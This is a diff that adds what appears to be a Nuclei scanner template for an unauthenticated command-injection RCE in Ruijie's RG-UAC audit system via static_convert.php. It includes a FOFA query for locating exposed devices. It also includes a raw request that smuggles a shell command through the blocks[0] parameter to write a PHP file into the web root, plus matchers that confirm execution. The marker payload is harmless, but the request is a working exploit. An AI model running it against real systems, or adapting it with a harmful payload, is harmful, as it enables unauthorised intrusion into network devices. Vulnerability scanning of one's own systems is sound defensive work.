@@ -1,0 +1,26 @@
+id: ruijie-static_convert-RCE
+
+info:
+  name: 锐捷统一上网行为管理与审计系统 static_convert.php 前台RCE漏洞
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: title="RG-UAC登录页面"
+
+  tags: RCE
+
+http:
+  - raw:
+      - |
+        GET /view/IPV6/naborTable/static_convert.php?blocks[0]=|echo%20%27<?php%20print("HuanXiong");unlink(__FILE__);?>%27%20>/var/www/html/test.php HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /test.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: dsl
+        dsl:
+          - 'len(body) >= 9 && len(body) <= 10'
+          - 'status_code == 200'
+          - 'contains(body, "HuanXiong")'
+        condition: and
